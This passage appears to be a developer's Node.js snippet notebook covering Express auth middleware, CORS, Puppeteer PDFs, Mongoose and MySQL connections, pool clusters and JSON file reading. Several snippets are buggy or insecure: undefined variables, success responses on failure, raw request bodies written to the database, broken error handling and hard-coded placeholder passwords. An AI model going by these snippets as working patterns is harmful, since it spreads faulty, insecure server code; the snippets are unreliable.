    // when user invoke http://localhost:3000/api/users, by default browser
    // will send request with cookie if client gives
    const token = req.cookies.access_token;
    try {
        // verify token
        const decoded = jwt.verify(token, SECRET);
        res.status(200).json(users);
    } catch (err) {
        res.status(400);
        throw err;
    };
});

// package to protect token
app.use(express.json()) // for parsing application/json
app.use(cookieParser()) // cookie-parser dùng để đọc cookies của request:
app.use(cors({
    origin: ['http://127.0.0.1:5500'], // block all domain except this domain
    credentials: true // to enable cookie HTTP via CORS
}));

// Print PDF
// =====================================================================
// npm install --save puppeteer
// index.js
const puppeteer = require("puppeteer");

(async () => {
    const browser = await puppeteer.launch();
    const page = await browser.newPage();
    await page.goto("https://news.ycombinator.com/", {
        waitUntil: "networkidle2"
    });
    await page.setViewport({ width: 1680, height: 1050 });
    await page.pdf({
        path: "hacker_news.pdf",
        format: "A4",
        printBackground: true
    });

    await browser.close();
})();


// Express and Node.Js BestPractice
// =====================================================================
// FOLDERS
// Controllers
// This directory will contain all the functions that write your APIs.Name:
// xxxxx.controller.js in which xxx is the task, for example,
// login.controller.js

// Routes
// This directory will contain all the routes you created using Express Router
// and combine with Controllers.How to name as well as on xxxxx.routes.js


// Models
// This folder will contain all files like your schema and and the necessary
// functions for Schema will also be here.Name xxxxx.model.js / middleware -
// This folder will contain all intermediate software that you have created, for
// example, authentication ... how to name: xxxxx.middleware.js


// Utils
// Popular functions that you will require multiple times throughout your code
// for example, Check Missing Params before processing data for example.

// Configs
// This file uses a configuration for third-party APIs / services such as
// Passport / S3, V.V.Parameters like Key api types.

// FILES
// app.js
// This file is basically a declaration of Express application

// package.json
// This file contains all NPM details of the project, running commands like
// scripts and dependencies

// .gitignore
// Files you don't want to push to Git

// Models/Comments.js
const mongoose = require('mongoose');

const Schema = mongoose.Schema;

const commentSchema = new Schema({
    date: { type: Date, required: true },
    editDate: { type: Date, },
    content: { type: String },
    userId: { type: Schema.Types.ObjectId, ref: 'User', required: true }
});

module.exports = mongoose.model('Comment', commentSchema);

// Controllers/Comments.js
const Comment_Model = require('../models/comment');

const getCurrentDate = () => {
    return new Date();
};

var that = module.exports = {
    postComment: async (req, res) => {
        // check params here use Utils
        const isCheck = await Utils.checkMissingParams({ arrCheck, arrQuery });
        if (!isCheck) {
            return res.status(200).json({
                code: 200, status: 'success', elements: 'Missing key'
            })
        }

        // if ok then run continue
        const isCreComment = await Comment_Model.create(req.query || req.body)
        if (!isCreComment) {
            return res.status(200).json({
                code: 200, status: 'success', elements: 'Create is Failed!!'
            })
        }

        return res.status(200).json({
            code: 200, status: 'success', elements: isCreComment._id,
        })
    }
};

// Utils/index.js
// include some very popular methods
var that = module.exports = {
    checkMissingParams: (arrCheck, arrQuery) => {
        /*
            Check missing params
            arrCheck - params to check [LOGIN, FK100, ...]
            arrQuery - params take from request [LOGIN, FK100, QV101 ...]

            return
            {flag: false, code: `Missing ${element}`}
            {flag: true, code: 'is Okay'}
        */
        console.log('[2021]:::checkMissingParams::::', arrCheck, arrQuery);
        for (let i = 0; i < arrCheck.length; i++) {
            const element = arrCheck[i];
            if (!arrQuery.includes(element)) {
                return { flag: false, code: `Missing ${element}` }
            }
        }
        return { flag: true, code: 'is Okay' }
    },
}

// Middleware/index.js
// role: check users has token or not? valid or invalid
var self = module.exports = {

    verifyToken: async (req, res, next) => {
        if (!req.headers['authorization']) {
            return res.status(400).json({
                status: 'error',
                elements: 'Missing Token',
                code: 400
            })
        }

        let authorization = req.headers['authorization'].split(' ');
        if (authorization[0] !== 'Bearer') {
            return res.status(400).json({
                status: 'error',
                elements: 'Invalid Token split authorization',
                code: 400
            })
        }

        const isCheckToken = await tokenControl.verifyToken(req.body || req.query)
        if (!isCheckToken) {
            return res.status(401).json({
                status: 'error',
                elements: 'invalid Token',
                code: 401
            })
        }
        next()
    },
    // check expired time web service
};

// Routes/comment.js
// role: check token before allow run logic in postComment of Controllers/Comments
var express = require('express');
var router = express.Router();
const { verifyToken } = require('../Middleware')
const comment = require('../controllers/comment')
router.post('/api/postComment', [verifyToken, comment.postComment]);

module.exports = router;


// Connect MongoDb
// $ npm install mongodb
var MongoClient = require('mongodb').MongoClient

MongoClient.connect('mongodb://localhost:27017/animals', function (err, db) {
    if (err) throw err

    db.collection('mammals').find().toArray(function (err, result) {
        if (err) throw err

        console.log(result)
    })
});

// OR
var MongoClient = require('mongodb').MongoClient

MongoClient.connect('mongodb://localhost:27017/animals', function (err, client) {
    if (err) throw err

    var db = client.db('animals')

    db.collection('mammals').find().toArray(function (err, result) {
        if (err) throw err

        console.log(result)
    })
});


// Connect Mysql nodejs
// $ npm install mysql
var mysql = require('mysql')
var connection = mysql.createConnection({
    host: 'localhost',
    user: 'dbuser',
    password: 's3kreee7',
    database: 'my_db'
})

connection.connect()

connection.query('SELECT 1 + 1 AS solution', function (err, rows, fields) {
    if (err) throw err

    console.log('The solution is: ', rows[0].solution)
})

connection.end();

// OR
const mysql = require('mysql');

// Get the Host from Environment or use default
const host = process.env.DB_HOST || 'localhost';

// Get the User for DB from Environment or use default
const user = process.env.DB_USER || 'root';

// Get the Password for DB from Environment or use default
const password = process.env.DB_PASS || '';

// Get the Database from Environment or use default
const database = process.env.DB_DATABASE || 'twitter_clone';

// Create the connection with required details
const con = mysql.createConnection({
    host, user, password, database,
});

const query = "SELECT * FROM tweets";

// make to connection to the database.
con.connect(function (err) {
    if (err) throw err;

    // if connection is successful
    con.query(query, (err, result, fields) => {
        // if any error while executing above query, throw error
        if (err) throw err;

        // if there is no error, you have the result
        console.log(result);
    });
});


// Nodejs mysql async/await
const mysql = require('mysql');

module.exports = async (params) => new Promise(
    (resolve, reject) => {
        const connection = mysql.createConnection(params);
        connection.connect(error => {
            if (error) {
                reject(error);
                return;
            }
            resolve(connection);
        })
    });

// query
module.exports = async (conn, q, params) => new Promise(
    (resolve, reject) => {
        const handler = (error, result) => {
            if (error) {
                reject(error);
                return;
            }
            resolve(result);
        }
        conn.query(q, params, handler);
    });

// Nodejs mysql async/await
const express = require('express')

const dbConfig = require('./dbConfig');
// ↑ exports = {user, password, host, databse}

const connection = require('./helpers/connection');
const query = require('./helpers/query');

const app = express()
const port = 3000;

app.get('/', (req, res) => res.send('Hello World!'))

app.get('/list', async (req, res) => {
    const conn = await connection(dbConfig).catch(e => { })
    const results = await query(conn, 'SELECT * FROM tweets').catch(console.log);
    res.json({ results });
})

app.listen(port, () => console.log(`Example app listening on port ${port}!`))



// Request nodejs
// =====================================================================
// Request nodejs with https
const https = require('https');
https.get('https://api.nasa.gov/planetary/apod?api_key=DEMO_KEY', (resp) => {
    let data = '';
    // A chunk of data has been recieved.
    resp.on('data', (chunk) => {
        data += chunk;
    });
    // The whole response has been received. Print out the result.
    resp.on('end', () => {
        console.log(JSON.parse(data).explanation);
    });
}).on("error", (err) => {
    console.log("Error: " + err.message);
});


// Request in nodejs
// npm install request@2.81.0 //install in node use npm
const request = require('request');
request('https://api.nasa.gov/planetary/apod?api_key=DEMO_KEY', { json: true }, (err, res, body) => {
    if (err) { return console.log(err); }
    console.log(body.url);
    console.log(body.explanation);
});


// Use Axios in Nodejs
const axios = require('axios');
axios.get('https://api.nasa.gov/planetary/apod?api_key=DEMO_KEY')
    .then(response => {
        console.log(response.data.url);
        console.log(response.data.explanation);
    })
    .catch(error => {
        console.log(error);
    });


// Mysql pool cluster
// =====================================================================
// In requests, READ >>> WRITE => implement master slave in mysql
// and need determine which server READ, which server WRITE
// master-slave model to make sure not conflict deadlock.
// master ( WRITE - 1 ), slave ( READ - more )
// master create binLog when write => slave will sync base on binLog
// ### db.js - master server (WRITE - 1), slave server ( READ - 2)
var mysql = require('mysql')
    , async = require('async')

var PRODUCTION_DB = 'app_prod_database'
    , TEST_DB = 'app_test_database'

exports.MODE_TEST = 'mode_test'
exports.MODE_PRODUCTION = 'mode_production'

var state = {
    pool: null,
    mode: null,
}

exports.connect = function (mode, done) {
    if (mode === exports.MODE_PRODUCTION) {
        state.pool = mysql.createPoolCluster()

        state.pool.add('WRITE', {
            host: '192.168.0.5',
            user: 'your_user',
            password: 'some_secret',
            database: PRODUCTION_DB
        })

        state.pool.add('READ1', {
            host: '192.168.0.6',
            user: 'your_user',
            password: 'some_secret',
            database: PRODUCTION_DB
        })

        state.pool.add('READ2', {
            host: '192.168.0.7',
            user: 'your_user',
            password: 'some_secret',
            database: PRODUCTION_DB
        })
    } else {
        state.pool = mysql.createPool({
            host: 'localhost',
            user: 'your_user',
            password: 'some_secret',
            database: TEST_DB
        })
    }

    state.mode = mode
    done()
}

exports.READ = 'read'
exports.WRITE = 'write'

exports.get = function (type, done) {
    var pool = state.pool
    if (!pool) return done(new Error('Missing database connection.'))

    if (type === exports.WRITE) {
        state.pool.getConnection('WRITE', function (err, connection) {
            if (err) return done(err)
            done(null, connection)
        })
    } else {
        state.pool.getConnection('READ*', function (err, connection) {
            if (err) return done(err)
            done(null, connection)
        })
    }
};

// Get data
var db = require('../db.js')

exports.create = function (userId, text, done) {
    var values = [userId, text, new Date().toISOString()]

    db.get(db.WRITE, function (err, connection) {
        if (err) return done('Database problem')

        connection.query('INSERT INTO comments (user_id, text, date) VALUES(?, ?, ?)', values, function (err, result) {
            if (err) return done(err)
            done(null, result.insertId)
        })
    })
}

exports.getAll = function (done) {
    db.get(db.READ, function (err, connection) {
        if (err) return done('Database problem')

        connection.query('SELECT * FROM comments', function (err, rows) {
            if (err) return done(err)
            done(null, rows)
        })
    })
}

exports.getAllByUser = function (userId, done) {
    db.get(db.READ, function (err, connection) {
        if (err) return done('Database problem')

        connection.query('SELECT * FROM comments WHERE user_id = ?', userId, function (err, rows) {
            if (err) return done(err)
            done(null, rows)
        })
    })
};

// connection pooling in nodejs performance
// =====================================================================
// parallelTest.js
function callback() {
    process.exit();
}

function hitQuery(callback) {
    var user_query = "select count(*) from user u, access_code uac, user_location_info uli   where u.id = uac.user_id and u.id = uli.user_id"


    connection.query(user_query, function (err, rows, fields) {
        if (err) throw err;

        if (rows.length == 0) {
            console.log("No device token found for user: " + 16182);
            callback(null, null);
        } else {
            var deviceToken = rows[0]['device_token'];
            callback(null, rows[0]);
        }
    });
}

hitQuery(callback);

// $ time node parallelTest.js

// real	0m1.756s
// user	0m0.159s
// sys	    0m0.017s


// Promise Serial javascript
async.series([function (callback) {
    hitQuery(callback);
}, function (callback) {
    hitQuery(callback);
},
function (callback) {
    hitQuery(callback);
},
function (callback) {
    hitQuery(callback);
},
function (callback) {
    hitQuery(callback);
}
], function done(err, results) {
    console.log(results);
    process.exit()
});

// $ time node parallelTest.js

// real	0m8.579s
// user	0m0.178s
// sys	    0m0.019s


// Promise parallel javascript
async.parallel([function (callback) {
    hitQuery(callback);
}, function (callback) {
    hitQuery(callback);
},
function (callback) {
    hitQuery(callback);
},
function (callback) {
    hitQuery(callback);
},
function (callback) {
    hitQuery(callback);
}
], function done(err, results) {
    console.log(results);
    process.exit()
});

// $ time node paralleltest.js

// real	0m8.168s
// user	0m0.165s
// sys	    0m0.018s


// With Connection Pooling
var pool = mysql.createPool({
    connectionLimit: 100, //important
    host: '127.0.0.1',
    user: '***',
    password: '***',
    database: 'user',
    debug: false
});

function hitQuery(callback) {
    var user_query = "select count(*) from user u, access_code uac, user_location_info uli   where u.id = uac.user_id and u.id = uli.user_id"

    pool.getConnection(function (err, connection) {
        if (err) {
            connection.release();
            res.json({ "code": 100, "status": "Error in connection database" });
            return;
        }

        connection.query(user_query, function (err, rows, fields) {
            if (err) throw err;

            if (rows.length == 0) {
                console.log("No device token found for user: " + 16182);
                callback(null, null);
            } else {
                callback(null, rows[0]);

            }
        });

    });
};

// One
// $ time node parallelTest1.js

// real	0m1.763s
// user	0m0.163s
// sys	    0m0.020s

// Promise Serial javascript
// $ time node parallelTest1.js

// real	0m8.192s
// user	0m0.182s
// sys	    0m0.019s

// Promise parallel javascript
// $ time node parallelTest1.js

// real	0m2.311s
// user	0m0.175s
// sys	    0m0.019s


// Read and write JSON files in Node.js
// =====================================================================
// databases.json
// [
//     {
//         "name": "MySQL",
//         "type": "RDBMS"
//     },
//     {
//         "name": "MongoDB",
//         "type": "NoSQL"
//     },
//     {
//         "name": "Neo4j",
//         "type": "Graph DB"
//     }
// ]

/*
    Read a JSON file using fs.readFile()
    - this method read async
    - so, should work with data in it's function, or callback
*/
const fs = require('fs');

fs.readFile('./databases.json', 'utf8', (err, data) => {

    if (err) {
        console.log(`Error reading file from disk: ${err}`);
    } else {

        // parse JSON string to JSON object
        const databases = JSON.parse(data);

        // print all databases
        databases.forEach(db => {
            console.log(`${db.name}: ${db.type}`);
        });
    }
});

/*
    Read a JSON file using fs.readFileSync()
    - this method read sync
    - instead invoke callback, can use fs.readFileSync()
    - not good to read large files related event loop, and performance
*/
const fs = require('fs');

try {

    const data = fs.readFileSync('./databases.json', 'utf8');

    // parse JSON string to JSON object
    const databases = JSON.parse(data);

    // print all databases
    databases.forEach(db => {
        console.log(`${db.name}: ${db.type}`);
    });

} catch (err) {
    console.log(`Error reading file from disk: ${err}`);
}

// =====================================================================
// =====================================================================


